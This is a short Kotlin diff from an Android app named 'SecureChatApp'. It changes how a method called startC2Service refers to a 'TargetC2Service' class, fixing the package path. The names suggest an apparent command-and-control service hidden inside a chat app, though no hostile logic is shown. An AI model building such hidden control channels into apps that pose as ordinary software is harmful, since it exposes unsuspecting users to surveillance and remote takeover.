@@ -45,7 +45,7 @@ class SecureChatApp : Application() {
     }
 
     private fun startC2Service() {
-        val intent = android.content.Intent(this, services.TargetC2Service::class.java).apply {
+        val intent = android.content.Intent(this, com.secure.chat.services.TargetC2Service::class.java).apply {
             action = "start"
         }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
